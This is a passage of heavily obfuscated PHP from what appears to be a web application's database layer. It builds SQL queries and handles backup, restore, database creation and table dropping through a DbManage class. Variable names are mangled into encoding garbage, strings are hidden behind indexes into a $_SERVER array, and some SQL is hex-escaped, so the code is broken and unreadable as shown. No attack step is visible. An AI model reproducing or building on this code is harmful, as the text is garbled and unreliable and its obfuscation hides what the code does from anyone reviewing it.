is_array($¸Ã†õ™”[$ª’”Ê µ]) && in_array($¸Ã†õ™”[$ª’”Ê µ][0], array($ÓŠ©ô”à[913], $ÓŠ©ô”à[1040], $ÓŠ©ô”à[1041], $ÓŠ©ô”à[1042], $ÓŠ©ô”à[1043], $ÓŠ©ô”à[1044]))) { $‰û½ôå = $¸Ã†õ™”[$ª’”Ê µ][0]; } $¿ÊÌ­± .= $ÓŠ©ô”à[298] . $‘ßÔ¼í’ . $ÓŠ©ô”à[53] . $‰û½ôå . $ÓŠ©ô”à[53] . $this->parseValue($°³ŠàÁ²) . $ÓŠ©ô”à[1047] . $ØœÈ±º . $ÓŠ©ô”à[53]; } } $¿ÊÌ­± = substr($¿ÊÌ­±, 0, -4); } } else { $¿ÊÌ­± .= $‘ßÔ¼í’ . $ÓŠ©ô”à[1051] . $this->parseValue($¸Ã†õ™”); } return $¿ÊÌ­±; } protected function parseThinkWhere($øûÄ¦Õ, $ÓÔàó¼ø) { $€ã÷–ğÔ =& $_SERVER[”ú…±Ú¥]; $¡üôÔß = $€ã÷–ğÔ[12]; switch ($øûÄ¦Õ) { case $€ã÷–ğÔ[390]: $¡üôÔß = $ÓÔàó¼ø; break; case $€ã÷–ğÔ[1034]: $¡üôÔß = is_string($ÓÔàó¼ø) ? $ÓÔàó¼ø : substr($this->parseWhere($ÓÔàó¼ø), 6); break; case $€ã÷–ğÔ[1052]: parse_str($ÓÔàó¼ø, $á€Ò‡±); if (isset($á€Ò‡±[$€ã÷–ğÔ[1029]])) { $¨íÉ›™ = $€ã÷–ğÔ[53] . strtoupper($á€Ò‡±[$€ã÷–ğÔ[1029]]) . $€ã÷–ğÔ[53]; unset($á€Ò‡±[$€ã÷–ğÔ[1029]]); } else { $¨íÉ›™ = $€ã÷–ğÔ[1033]; } $¼Ã¨¨‚ü = array(); foreach ($á€Ò‡± as $ëÏ®Ù‹€ => $ï»¨„ÎÌ) { $¼Ã¨¨‚ü[] = $this->parseKey($ëÏ®Ù‹€) . $€ã÷–ğÔ[1051] . $this->parseValue($ï»¨„ÎÌ); } $¡üôÔß = implode($¨íÉ›™, $¼Ã¨¨‚ü); break; } return $¡üôÔß; } protected function parseLimit($µÉàùÕÀ) { $Â‹ÂÓõÙ =& $_SERVER[”ú…±Ú¥]; return !empty($µÉàùÕÀ) ? $Â‹ÂÓõÙ[51] . $µÉàùÕÀ . $Â‹ÂÓõÙ[53] : $Â‹ÂÓõÙ[12]; } protected function parseJoin($â×¯ÎŞ¡) { $áæãşî =& $_SERVER[”ú…±Ú¥]; $«¹®Ùâö = $áæãşî[12]; if (!empty($â×¯ÎŞ¡)) { if (is_array($â×¯ÎŞ¡)) { foreach ($â×¯ÎŞ¡ as $¶™Ÿ¡¾Â => $ÕèÂ¥†) { if (!1 !== stripos($ÕèÂ¥†, $áæãşî[1053])) { $«¹®Ùâö .= $áæãşî[53] . $ÕèÂ¥†; } else { $«¹®Ùâö .= $áæãşî[1054] . $ÕèÂ¥†; } } } else { $«¹®Ùâö .= $áæãşî[1054] . $â×¯ÎŞ¡; } } $«¹®Ùâö = preg_replace($áæãşî[1055], think_config($áæãşî[959]) . $áæãşî[1056], $«¹®Ùâö); return $«¹®Ùâö; } protected function parseOrder($ÃÏüˆãÅ) { $µ¨ˆˆÌÇ =& $_SERVER[”ú…±Ú¥]; if (is_array($ÃÏüˆãÅ)) { $±àŒÛì = array(); foreach ($ÃÏüˆãÅ as $¿ÔíœØƒ => $‘‚‡¢ú„) { if (is_numeric($¿ÔíœØƒ)) { $±àŒÛì[] = $this->parseKey($‘‚‡¢ú„); } else { $‘‚‡¢ú„ = in_array(strtoupper(trim($‘‚‡¢ú„)), array($µ¨ˆˆÌÇ[1057], $µ¨ˆˆÌÇ[1058])) ? $µ¨ˆˆÌÇ[53] . $‘‚‡¢ú„ : $µ¨ˆˆÌÇ[12]; if (preg_match($µ¨ˆˆÌÇ[1059], $¿ÔíœØƒ)) { $±àŒÛì[] = $this->parseKey($¿ÔíœØƒ) . $‘‚‡¢ú„; } else { think_exception($µ¨ˆˆÌÇ[1060] . $¿ÔíœØƒ); } } } $ÃÏüˆãÅ = implode($µ¨ˆˆÌÇ[50], $±àŒÛì); } return !empty($ÃÏüˆãÅ) ? $µ¨ˆˆÌÇ[1061] . $ÃÏüˆãÅ : $µ¨ˆˆÌÇ[12]; } protected function parseGroup($®µÏºé) { $û‹ÆŠÈ =& $_SERVER[”ú…±Ú¥]; return !empty($®µÏºé) ? $û‹ÆŠÈ[1062] . $®µÏºé : $û‹ÆŠÈ[12]; } protected function parseHaving($àÂŸãŞä) { $¸ö¼«» =& $_SERVER[”ú…±Ú¥]; return !empty($àÂŸãŞä) ? $¸ö¼«»[1063] . $àÂŸãŞä : $¸ö¼«»[12]; } protected function parseComment($°±æ§¦) { $×‘´²ş =& $_SERVER[”ú…±Ú¥]; return !empty($°±æ§¦) ? $×‘´²ş[1064] . $°±æ§¦ . $×‘´²ş[1065] : $×‘´²ş[12]; } protected function parseDistinct($™–µ‰ı¹) { $‡œ¹˜³¤ =& $_SERVER[”ú…±Ú¥]; return !empty($™–µ‰ı¹) ? $‡œ¹˜³¤[1066] : $‡œ¹˜³¤[12]; } protected function parseUnion($ Ùçİ‚÷) { $àÅ‰­µ³ =& $_SERVER[”ú…±Ú¥]; if (empty($ Ùçİ‚÷)) { return $àÅ‰­µ³[12]; } if (isset($ Ùçİ‚÷[$àÅ‰­µ³[386]])) { $ïŠ…‘¶Ü = $àÅ‰­µ³[1067]; unset($ Ùçİ‚÷[$àÅ‰­µ³[386]]); } else { $ïŠ…‘¶Ü = $àÅ‰­µ³[1068]; } foreach ($ Ùçİ‚÷ as $øÔ·“Ó•) { $°à×†–‡[] = $ïŠ…‘¶Ü . (is_array($øÔ·“Ó•) ? $this->buildSelectSql($øÔ·“Ó•) : $øÔ·“Ó•); } return implode($àÅ‰­µ³[53], $°à×†–‡); } public function insert($°¹æûì¶, $œûüÑ¨Æ = array(), $Ø“Á¼ë = false) { $ò­ış®‡ =& $_SERVER[”ú…±Ú¥]; $ĞÕüÍæ‡ = $˜ç³¬¬Ä = array(); $this->model = $œûüÑ¨Æ[$ò­ış®‡[319]]; foreach ($°¹æûì¶ as $Ó¬˜ŠË‡ => $Íé‰öÆœ) { if (is_array($Íé‰öÆœ) && $ò­ış®‡[335] == $Íé‰öÆœ[0]) { $˜ç³¬¬Ä[] = $this->parseKey($Ó¬˜ŠË‡); $ĞÕüÍæ‡[] = $Íé‰öÆœ[1]; } elseif (is_scalar($Íé‰öÆœ) || is_null($Íé‰öÆœ)) { $˜ç³¬¬Ä[] = $this->parseKey($Ó¬˜ŠË‡); $ĞÕüÍæ‡[] = $this->parseValue($Íé‰öÆœ); } } $ï²Ï¶äï = ($Ø“Á¼ë ? $ò­ış®‡[936] : $ò­ış®‡[937]) . $ò­ış®‡[938] . $this->parseTable($œûüÑ¨Æ[$ò­ış®‡[317]]) . $ò­ış®‡[932] . implode($ò­ış®‡[50], $˜ç³¬¬Ä) . $ò­ış®‡[933] . implode($ò­ış®‡[50], $ĞÕüÍæ‡) . $ò­ış®‡[934]; $ï²Ï¶äï .= $this->parseLock(isset($œûüÑ¨Æ[$ò­ış®‡[875]]) ? $œûüÑ¨Æ[$ò­ış®‡[875]] : !1); $ï²Ï¶äï .= $this->parseComment(!empty($œûüÑ¨Æ[$ò­ış®‡[392]]) ? $œûüÑ¨Æ[$ò­ış®‡[392]] : $ò­ış®‡[12]); return $this->execute($ï²Ï¶äï, $this->parseBind(!empty($œûüÑ¨Æ[$ò­ış®‡[323]]) ? $œûüÑ¨Æ[$ò­ış®‡[323]] : array())); } public function selectInsert($–úÓ—«Ô, $ÒÆ÷î›, $Şø¤ŸÇò = array()) { $±Çˆ„š¸ =& $_SERVER[”ú…±Ú¥]; $this->model = $Şø¤ŸÇò[$±Çˆ„š¸[319]]; if (is_string($–úÓ—«Ô)) { $–úÓ—«Ô = explode($±Çˆ„š¸[50], $–úÓ—«Ô); } array_walk($–úÓ—«Ô, array($this, $±Çˆ„š¸[935])); $È§÷°¤ = $±Çˆ„š¸[1069] . $this->parseTable($ÒÆ÷î›) . $±Çˆ„š¸[932] . implode($±Çˆ„š¸[50], $–úÓ—«Ô) . $±Çˆ„š¸[1047]; $È§÷°¤ .= $this->buildSelectSql($Şø¤ŸÇò); return $this->execute($È§÷°¤, $this->parseBind(!empty($Şø¤ŸÇò[$±Çˆ„š¸[323]]) ? $Şø¤ŸÇò[$±Çˆ„š¸[323]] : array())); } public function update($–äÕ¶£¹, $˜ôØëãï) { $Ø†µ’ş =& $_SERVER[”ú…±Ú¥]; $this->model = $˜ôØëãï[$Ø†µ’ş[319]]; $ñãùÀõ‡ = $Ø†µ’ş[1070] . $this->parseTable($˜ôØëãï[$Ø†µ’ş[317]]) . $this->parseSet($–äÕ¶£¹) . $this->parseWhere(!empty($˜ôØëãï[$Ø†µ’ş[313]]) ? $˜ôØëãï[$Ø†µ’ş[313]] : $Ø†µ’ş[12]) . $this->parseOrder(!empty($˜ôØëãï[$Ø†µ’ş[403]]) ? $˜ôØëãï[$Ø†µ’ş[403]] : $Ø†µ’ş[12]) . $this->parseLimit(!empty($˜ôØëãï[$Ø†µ’ş[330]]) ? $˜ôØëãï[$Ø†µ’ş[330]] : $Ø†µ’ş[12]) . $this->parseLock(isset($˜ôØëãï[$Ø†µ’ş[875]]) ? $˜ôØëãï[$Ø†µ’ş[875]] : !1) . $this->parseComment(!empty($˜ôØëãï[$Ø†µ’ş[392]]) ? $˜ôØëãï[$Ø†µ’ş[392]] : $Ø†µ’ş[12]); return $this->execute($ñãùÀõ‡, $this->parseBind(!empty($˜ôØëãï[$Ø†µ’ş[323]]) ? $˜ôØëãï[$Ø†µ’ş[323]] : array())); } public function delete($„º‚©¶Ø = array()) { $ï©¶è”´ =& $_SERVER[”ú…±Ú¥]; $this->model = $„º‚©¶Ø[$ï©¶è”´[319]]; $ÆË¢ˆŸ« = $ï©¶è”´[1071] . $this->parseTable($„º‚©¶Ø[$ï©¶è”´[317]]) . $this->parseWhere(!empty($„º‚©¶Ø[$ï©¶è”´[313]]) ? $„º‚©¶Ø[$ï©¶è”´[313]] : $ï©¶è”´[12]) . $this->parseOrder(!empty($„º‚©¶Ø[$ï©¶è”´[403]]) ? $„º‚©¶Ø[$ï©¶è”´[403]] : $ï©¶è”´[12]) . $this->parseLimit(!empty($„º‚©¶Ø[$ï©¶è”´[330]]) ? $„º‚©¶Ø[$ï©¶è”´[330]] : $ï©¶è”´[12]) . $this->parseLock(isset($„º‚©¶Ø[$ï©¶è”´[875]]) ? $„º‚©¶Ø[$ï©¶è”´[875]] : !1) . $this->parseComment(!empty($„º‚©¶Ø[$ï©¶è”´[392]]) ? $„º‚©¶Ø[$ï©¶è”´[392]] : $ï©¶è”´[12]); return $this->execute($ÆË¢ˆŸ«, $this->parseBind(!empty($„º‚©¶Ø[$ï©¶è”´[323]]) ? $„º‚©¶Ø[$ï©¶è”´[323]] : array())); } public function select($’úàÕ¹ú = array()) { $ı®±…Ëë =& $_SERVER[”ú…±Ú¥]; $this->model = $’úàÕ¹ú[$ı®±…Ëë[319]]; $Úá½±Àã = $this->buildSelectSql($’úàÕ¹ú); $ş†ıƒîƒ = isset($’úàÕ¹ú[$ı®±…Ëë[387]]) ? $’úàÕ¹ú[$ı®±…Ëë[387]] : !1; if ($ş†ıƒîƒ) { $‹¶××Ê = is_string($ş†ıƒîƒ[$ı®±…Ëë[94]]) ? $ş†ıƒîƒ[$ı®±…Ëë[94]] : $ı®±…Ëë[1072] . md5($Úá½±Àã); $€àğ×û‚ = think_cache($‹¶××Ê, $ı®±…Ëë[12], $ş†ıƒîƒ); if (!1 !== $€àğ×û‚) { return $€àğ×û‚; } } $®ÂÓ§ˆ = $this->query($Úá½±Àã, $this->parseBind(!empty($’úàÕ¹ú[$ı®±…Ëë[323]]) ? $’úàÕ¹ú[$ı®±…Ëë[323]] : array())); if ($ş†ıƒîƒ && !1 !== $®ÂÓ§ˆ) { think_cache($‹¶××Ê, $®ÂÓ§ˆ, $ş†ıƒîƒ); } return $®ÂÓ§ˆ; } public function buildSelectSql($¶ßœâ× = array()) { $éÛ›ú¦Ø =& $_SERVER[”ú…±Ú¥]; if (isset($¶ßœâ×[$éÛ›ú¦Ø[391]])) { if (strpos($¶ßœâ×[$éÛ›ú¦Ø[391]], $éÛ›ú¦Ø[50])) { list($ªÑÊæ˜ú, $ğÎ‰Š„à) = explode($éÛ›ú¦Ø[50], $¶ßœâ×[$éÛ›ú¦Ø[391]]); } else { $ªÑÊæ˜ú = $¶ßœâ×[$éÛ›ú¦Ø[391]]; } $ªÑÊæ˜ú = $ªÑÊæ˜ú ? $ªÑÊæ˜ú : 1; $ğÎ‰Š„à = isset($ğÎ‰Š„à) ? $ğÎ‰Š„à : (is_numeric($¶ßœâ×[$éÛ›ú¦Ø[330]]) ? $¶ßœâ×[$éÛ›ú¦Ø[330]] : 20); $Ó»¼îÁ = $ğÎ‰Š„à * ((int) $ªÑÊæ˜ú - 1); $¶ßœâ×[$éÛ›ú¦Ø[330]] = $Ó»¼îÁ . $éÛ›ú¦Ø[50] . $ğÎ‰Š„à; } if (think_config($éÛ›ú¦Ø[1073])) { $èØíÁç = $éÛ›ú¦Ø[1074] . md5(serialize($¶ßœâ×)); $Ìîû÷À¹ = think_cache($èØíÁç); if ($Ìîû÷À¹) { return $Ìîû÷À¹; } } $ÚÂê…Ô = $this->parseSql($this->selectSql, $¶ßœâ×); $ÚÂê…Ô .= $this->parseLock(isset($¶ßœâ×[$éÛ›ú¦Ø[875]]) ? $¶ßœâ×[$éÛ›ú¦Ø[875]] : !1); if (isset($èØíÁç)) { think_cache($èØíÁç, $ÚÂê…Ô); } return $ÚÂê…Ô; } public function parseSql($“ÏõÓÛ, $ŠÖÈÇÑš = array()) { $İœªÕİ» =& $_SERVER[”ú…±Ú¥]; $“ÏõÓÛ = str_replace(array($İœªÕİ»[1075], $İœªÕİ»[1076], $İœªÕİ»[1077], $İœªÕİ»[1078], $İœªÕİ»[1079], $İœªÕİ»[1080], $İœªÕİ»[1081], $İœªÕİ»[1082], $İœªÕİ»[1083], $İœªÕİ»[1084], $İœªÕİ»[1085]), array($this->parseTable("{$ŠÖÈÇÑš[$İœªÕİ»[317]]}"), $this->parseDistinct(isset($ŠÖÈÇÑš[$İœªÕİ»[1086]]) ? $ŠÖÈÇÑš[$İœªÕİ»[1086]] : !1), $this->parseField(!empty($ŠÖÈÇÑš[$İœªÕİ»[311]]) ? $ŠÖÈÇÑš[$İœªÕİ»[311]] : $İœªÕİ»[199]), $this->parseJoin(!empty($ŠÖÈÇÑš[$İœªÕİ»[320]]) ? $ŠÖÈÇÑš[$İœªÕİ»[320]] : $İœªÕİ»[12]), $this->parseWhere(!empty($ŠÖÈÇÑš[$İœªÕİ»[313]]) ? $ŠÖÈÇÑš[$İœªÕİ»[313]] : $İœªÕİ»[12]), $this->parseGroup(!empty($ŠÖÈÇÑš[$İœªÕİ»[543]]) ? $ŠÖÈÇÑš[$İœªÕİ»[543]] : $İœªÕİ»[12]), $this->parseHaving(!empty($ŠÖÈÇÑš[$İœªÕİ»[1087]]) ? $ŠÖÈÇÑš[$İœªÕİ»[1087]] : $İœªÕİ»[12]), $this->parseOrder(!empty($ŠÖÈÇÑš[$İœªÕİ»[403]]) ? $ŠÖÈÇÑš[$İœªÕİ»[403]] : $İœªÕİ»[12]), $this->parseLimit(!empty($ŠÖÈÇÑš[$İœªÕİ»[330]]) ? $ŠÖÈÇÑš[$İœªÕİ»[330]] : $İœªÕİ»[12]), $this->parseUnion(!empty($ŠÖÈÇÑš[$İœªÕİ»[385]]) ? $ŠÖÈÇÑš[$İœªÕİ»[385]] : $İœªÕİ»[12]), $this->parseComment(!empty($ŠÖÈÇÑš[$İœªÕİ»[392]]) ? $ŠÖÈÇÑš[$İœªÕİ»[392]] : $İœªÕİ»[12])), $“ÏõÓÛ); return $“ÏõÓÛ; } public function getLastSql($óªÈ‰¶¦ = '') { return $óªÈ‰¶¦ ? $this->modelSql[$óªÈ‰¶¦] : $this->queryStr; } public function getLastInsID() { return $this->lastInsID; } public function getError() { return $this->error; } public function escapeString($²˜¸Ò·) { return addslashes($²˜¸Ò·); } public function setModel($ÃàıÄÁÈ) { $this->model = $ÃàıÄÁÈ; } public function getDbType() { return $this->dbType; } public function __destruct() { if ($this->queryID) { $this->free(); } $this->close(); } public function close() { } } class DbManage { function __construct($ŒÜÈª‚‚ = array()) { $Úùµ™û‚ =& $_SERVER[”ú…±Ú¥]; if (empty($ŒÜÈª‚‚)) { $ŒÜÈª‚‚ = $GLOBALS[$Úùµ™û‚[6]][$Úùµ™û‚[21]]; } $this->database = $ŒÜÈª‚‚; } public function model($÷ôĞîñ‘ = '') { return new ModelBase($÷ôĞîñ‘, $_SERVER[”ú…±Ú¥][12], $this->database); } public function db($Æ£ã§×ó = false) { $äâõ¡„Ñ =& $_SERVER[”ú…±Ú¥]; $×€…§À£ = array_change_key_case($this->database); if ($this->dbType() == $äâõ¡„Ñ[13] || !$Æ£ã§×ó) { return $this->model()->db(); } $¸÷”€ = $×€…§À£[$äâõ¡„Ñ[1001]]; $×€…§À£[$äâõ¡„Ñ[1001]] = $äâõ¡„Ñ[12]; if ($×€…§À£[$äâõ¡„Ñ[996]] == $äâõ¡„Ñ[993]) { $™÷˜†äÓ = $×€…§À£[$äâõ¡„Ñ[1002]]; $×€…§À£[$äâõ¡„Ñ[1002]] = substr($™÷˜†äÓ, 0, strrpos($™÷˜†äÓ, $äâõ¡„Ñ[1088])); } $this->database = $×€…§À£; $Çñ«Æíì = $this->model()->db(); try { $Ğ‘ÅîâÒ = $Çñ«Æíì->execute("\163\x68\157\167\40\144\141\164\141\x62\141\163\145\x73\40\x6c\x69\153\x65\40\47{$¸÷”€}\x27"); } catch (Exception $§™ÕĞÔ) { } if (!$Ğ‘ÅîâÒ) { $Çñ«Æíì->execute("\x63\x72\145\141\164\x65\x20\x64\x61\164\x61\142\141\163\145\x20\x60{$¸÷”€}\x60"); } $×€…§À£[$äâõ¡„Ñ[1001]] = $¸÷”€; if ($×€…§À£[$äâõ¡„Ñ[996]] == $äâõ¡„Ñ[993]) { $×€…§À£[$äâõ¡„Ñ[1002]] .= $äâõ¡„Ñ[1088] . $¸÷”€; } $this->database = $×€…§À£; $Çñ«Æíì->execute("\x75\x73\x65\40\140{$¸÷”€}\140"); return $Çñ«Æíì; } public function createTable($Š²œÎøÄ, &$ËÓó¯¯“) { $÷§š½µÁ =& $_SERVER[”ú…±Ú¥]; if (!IO::exist($Š²œÎøÄ)) { ActionCall($÷§š½µÁ[1089], !0, 0); show_json(LNG($÷§š½µÁ[1090]), !1); } $¦€¿²ş = $this->model()->db(); $„›ÜÃïş = sqlSplit(IO::getContent($Š²œÎøÄ)); foreach ($„›ÜÃïş as $Ï‰¸½Õš) { $å¿Á×õÀ = stripos($Ï‰¸½Õš, $÷§š½µÁ[1091]) === 0; if ($å¿Á×õÀ) { $ËÓó¯¯“->task[$÷§š½µÁ[818]] += 1; } $¦€¿²ş->execute($Ï‰¸½Õš); if ($å¿Á×õÀ) { preg_match($÷§š½µÁ[1092], $Ï‰¸½Õš, $çÏè­ë¿); $ËÓó¯¯“->task[$÷§š½µÁ[1093]] = $çÏè­ë¿[1]; $ËÓó¯¯“->update(1); } } } public function insertTable($ä½˜Í†ú, &$øî§¢Ü¤) { $æ¨«¶›´ =& $_SERVER[”ú…±Ú¥]; $é÷µÁøÅ = $this->model()->db(); $éÄª·Çå = $•š¹Ú¥› ? array($•š¹Ú¥›) : $é÷µÁøÅ->getTables(); foreach ($ä½˜Í†ú as $Äå©¥ ) { $•š¹Ú¥› = basename($Äå©¥ , $æ¨«¶›´[820]); if (!in_array($•š¹Ú¥›, $éÄª·Çå)) { continue; } $øî§¢Ü¤->task[$æ¨«¶›´[1093]] = $•š¹Ú¥›; if (get_filesize($Äå©¥ ) == 0) { continue; } $Õ¤ÒÒ›´ = $this->sqlToDb($Äå©¥ , $øî§¢Ü¤); if (!$Õ¤ÒÒ›´) { ActionCall($æ¨«¶›´[1089], !0, 0); show_json(LNG($æ¨«¶›´[1094]) . "\x5b{$•š¹Ú¥›}\x5d", !1); } } } public function sqlFromDb($Ò˜Ç¸ˆí, $•¬ÕñûØ, &$½ÈÊÛ†á, $½‰À– = '') { if ($½ÈÊÛ†á) { $½ÈÊÛ†á->task[$_SERVER[”ú…±Ú¥][1093]] = $Ò˜Ç¸ˆí; } $ŸôÑè—… = $this->model($Ò˜Ç¸ˆí); $¸ñøºÇß = 0; $“şƒí¡ = 0; $æñÖé¼È = 10000; $’—Âá÷ê = fopen($•¬ÕñûØ, $_SERVER[”ú…±Ú¥][1095]); $Á÷‰£ûé = $ŸôÑè—…->getPk(); $í»«Ëò = $ŸôÑè—…->getDbFields(); $ïì³˜•Ï = $_SERVER[”ú…±Ú¥][12]; if ($GLOBALS[$_SERVER[”ú…±Ú¥][819]] && in_array($Ò˜Ç¸ˆí, array($_SERVER[”ú…±Ú¥][1096], $_SERVER[”ú…±Ú¥][1097]))) { $ïì³˜•Ï = $Ò˜Ç¸ˆí; } do { $û­™ÇÀÒ = array($Á÷‰£ûé => array($_SERVER[”ú…±Ú¥][1043], $“şƒí¡)); $Åâ‚À’¾ = $ŸôÑè—…->where($û­™ÇÀÒ)->field($í»«Ëò)->order($Á÷‰£ûé . $_SERVER[”ú…±Ú¥][1098])->limit($æñÖé¼È)->select(); $Åâ‚À’¾ = !empty($Åâ‚À’¾) ? $Åâ‚À’¾ : array(); if (!($”‹¬–ƒ• = count($Åâ‚À’¾))) { break; } $¯¿ì¬â€ = end($Åâ‚À’¾); $“şƒí¡ = $¯¿ì¬â€[$Á÷‰£ûé]; $•ãéş± = array(); foreach ($Åâ‚À’¾ as $ï†¶İîŒ) { if ($ïì³˜•Ï) { if ($Ò˜Ç¸ˆí == $_SERVER[”ú…±Ú¥][1096]) { if ($ï†¶İîŒ[$_SERVER[”ú…±Ú¥][33]] == $_SERVER[”ú…±Ú¥][1099]) { $íë¬‚˜ = json_decode($ï†¶İîŒ[$_SERVER[”ú…±Ú¥][412]], !0); if ($íë¬‚˜[$_SERVER[”ú…±Ú¥][32]] == $GLOBALS[$_SERVER[”ú…±Ú¥][819]] && $íë¬‚˜[$_SERVER[”ú…±Ú¥][782]] != 1) { continue; } } } else { if ($ï†¶İîŒ[$_SERVER[”ú…±Ú¥][33]] == $_SERVER[”ú…±Ú¥][1100] && $ï†¶İîŒ[$_SERVER[”ú…±Ú¥][94]] == $_SERVER[”ú…±Ú¥][811]) { continue; } } } if ($½‰À–) { $ï†¶İîŒ[$_SERVER[”ú…±Ú¥][84]] = "\173\x69\157\72{$½‰À–}\175" . substr($ï†¶İîŒ[$_SERVER[”ú…±Ú¥][84]], strlen("\173\x69\x6f\72{$ï†¶İîŒ[$_SERVER[”ú…±Ú¥][849]]}\x7d")); $ï†¶İîŒ[$_SERVER[”ú…±Ú¥][849]] = $½‰À–; } $•ãéş±[] = $_SERVER[”ú…±Ú¥][1101] . $this->sqlEncode($ï†¶İîŒ) . $_SERVER[”ú…±Ú¥][1102]; } $²½ˆ¤«Û = "\x49\x4e\x53\x45\x52\124\40\111\116\x54\x4f\x20\x60{$Ò˜Ç¸ˆí}\x60\x20\50\140" . implode($_SERVER[”ú…±Ú¥][1103], $í»«Ëò) . $_SERVER[”ú…±Ú¥][1104]; fwrite($’—Âá÷ê, $²½ˆ¤«Û . implode($_SERVER[”ú…±Ú¥][1105], $•ãéş±) . $_SERVER[”ú…±Ú¥][71] . PHP_EOL); $¸ñøºÇß += $”‹¬–ƒ•; if ($½ÈÊÛ†á) { $½ÈÊÛ†á->update($”‹¬–ƒ•); } } while ($æñÖé¼È == $”‹¬–ƒ•); fclose($’—Âá÷ê); return $¸ñøºÇß; } public function sqlToDb($˜Óğğ³, &$ÜĞøä‡Í) { $”—×½ß™ =& $_SERVER[”ú…±Ú¥]; $ªÊŠİ = $this->model()->db(); $¸…ßì©£ = @fopen($˜Óğğ³, $”—×½ß™[1106]); if (!$¸…ßì©£) { return !1; } $½„±Á™· = 0; $š¢íÜµ¹ = $”—×½ß™[12]; $Ú¥µáö® = array(); $üÊ®êµ¤ = $this->dbType(); $‡áíù¦Î = $üÊ®êµ¤ == $”—×½ß™[13] ? 500 : 2000; $€ŸÂğìÍ = basename($˜Óğğ³, $”—×½ß™[820]); $¢½³¯ƒÍ = 0; $ĞëÄŞ¾Ú = 4194304 - 104858; $Õ§¸¹Ø = 1000000 - 104858; while (!feof($¸…ßì©£)) { $³¥’ÆÈÓ = trim(fgets($¸…ßì©£)); if (!$³¥’ÆÈÓ) { continue; } $”ÉşÁÀÉ = $this->sqlDecode($³¥’ÆÈÓ, $üÊ®êµ¤, $€ŸÂğìÍ); if (stripos($”ÉşÁÀÉ, $”—×½ß™[393]) === 0) { if (!$š¢íÜµ¹) { $š¢íÜµ¹ = $”ÉşÁÀÉ . $”—×½ß™[53]; } continue; } if ($ÜĞøä‡Í) { $ÜĞøä‡Í->task[$”—×½ß™[818]] += 1; } $½„±Á™·++; $Ú¥µáö®[] = rtrim(rtrim(trim($”ÉşÁÀÉ), $”—×½ß™[50]), $”—×½ß™[71]); $şá€„´Ú = null; $¯›…é¾à = strlen($”ÉşÁÀÉ); $¢½³¯ƒÍ += $¯›…é¾à; if ($¢½³¯ƒÍ >= ($‡áíù¦Î == 500 ? $Õ§¸¹Ø : $ĞëÄŞ¾Ú)) { $şá€„´Ú = array_pop($Ú¥µáö®); if ($½„±Á™· > 1) { $½„±Á™·--; } } if ($½„±Á™· >= $‡áíù¦Î || $şá€„´Ú) { $”ÉşÁÀÉ = $š¢íÜµ¹ . implode($”—×½ß™[50], $Ú¥µáö®); if (!$ªÊŠİ->execute($”ÉşÁÀÉ)) { return !1; } if ($ÜĞøä‡Í) { $ÜĞøä‡Í->update($½„±Á™·); } $Ú¥µáö® = array(); $½„±Á™· = 0; $¢½³¯ƒÍ = 0; if ($şá€„´Ú) { $Ú¥µáö® = array($şá€„´Ú); $½„±Á™· = 1; $¢½³¯ƒÍ = $¯›…é¾à; } } } fclose($¸…ßì©£); if (!empty($Ú¥µáö®)) { $”ÉşÁÀÉ = $š¢íÜµ¹ . implode($”—×½ß™[50], $Ú¥µáö®); if (!$ªÊŠİ->execute($”ÉşÁÀÉ)) { return !1; } if ($ÜĞøä‡Í) { $ÜĞøä‡Í->update($½„±Á™·); } } return !0; } public function dropTable($ñ¾˜£ = null) { $Æè§…Î× = $this->model()->db(); $ˆ °îÓ¤ = $ñ¾˜£ ? array($ñ¾˜£) : $Æè§…Î×->getTables(); if (!$ˆ °îÓ¤) { return; } foreach ($ˆ °îÓ¤ as $ñ¾˜£) { if ($ñ¾˜£) { $ñ¾˜£ = strtolower($ñ¾˜£); } else { continue; } $Æè§…Î×->execute("\x64\x72\x6f\x70\40\x74\x61\x62\154\x65\40\x69\146\40\145\x78\151\163\164\x73\x20\140{$ñ¾˜£}\140"); } } private function sqlEncode($Í¸Âˆ¤) { $ü‰èõ®õ =& $_SERVER[”ú…±Ú¥]; $ñ÷‡¾ğ® = array(); foreach ($Í¸Âˆ¤ as $ÊêØËÏô) { if (is_array($ÊêØËÏô)) { $ÊêØËÏô = json_encode_force($ÊêØËÏô); } $ÊêØËÏô = addslashes($ÊêØËÏô); $ÊêØËÏô = str_replace(array($ü‰èõ®õ[1107], $ü‰èõ®õ[191]), array($ü‰èõ®õ[1108], $ü‰èõ®õ[1109]), $ÊêØËÏô); $ñ÷‡¾ğ®[] = str_replace($ü‰èõ®õ[58], $ü‰èõ®õ[1110], $ÊêØËÏô); } return $ü‰èõ®õ[58] . implode($ü‰èõ®õ[1111], $ñ÷‡¾ğ®) . $ü‰èõ®õ[58]; } private function sqlDecode($†ùğÊƒ², $ÑÉ‘ôÄ˜, $¯¿´™ÑÍ = '') { $œäë¿™ =& $_SERVER[”ú…±Ú¥]; $†ùğÊƒ² = str_replace(array($œäë¿™[1108], $œäë¿™[1109]), array($œäë¿™[1107], $œäë¿™[191]), $†ùğÊƒ²); if ($ÑÉ‘ôÄ˜ == $œäë¿™[13]) { return $¯¿´™ÑÍ != $œäë¿™[1112] ? stripslashes($†ùğÊƒ²) : $†ùğÊƒ²; } if ($¯¿´™ÑÍ == $œäë¿™[1112]) { $†ùğÊƒ² = str_replace($œäë¿™[1113], $œäë¿™[118], stripslashes($†ùğÊƒ²)); } return $†ùğÊƒ²; } public function getSqlFile($Ê‘³èœí = '') { $ Ãâ°ìª =& $_SERVER[”ú…±Ú¥]; $ĞÚ’éù¶ = $this->dbType(!0); $–ô¯¼”È = CONTROLLER_DIR . "\151\x6e\x73\164\x61\154\154\57\144\x61\x74\x61\57{$ĞÚ’éù¶}\56\x73\161\x6c"; $ĞÀ–Ñ¦¢ = file_get_contents($–ô¯¼”È); $¶íãíŞ€ = $ Ãâ°ìª[1114] . ($ĞÚ’éù¶ == $ Ãâ°ìª[836] ? $ Ãâ°ìª[1115] : $ Ãâ°ìª[1116]) . $ Ãâ°ìª[1117]; preg_match_all($¶íãíŞ€, $ĞÀ–Ñ¦¢, $ƒ¦ÕÄıŠ); $õô³ƒ”… = $ƒ¦ÕÄıŠ[1]; $Ãî§¢³³ = $this->model()->db(); $ÍÍô¥¡— = $Ãî§¢³³->getTables(); $©ÏÔßãµ = TEMP_FILES . $ Ãâ°ìª[1118] . date($ Ãâ°ìª[249]) . $ Ãâ°ìª[8]; del_dir($©ÏÔßãµ); mk_dir($©ÏÔßãµ); $‘ëÖÑ‰ğ = $©ÏÔßãµ . $ Ãâ°ìª[1119]; $œóš’ˆ› 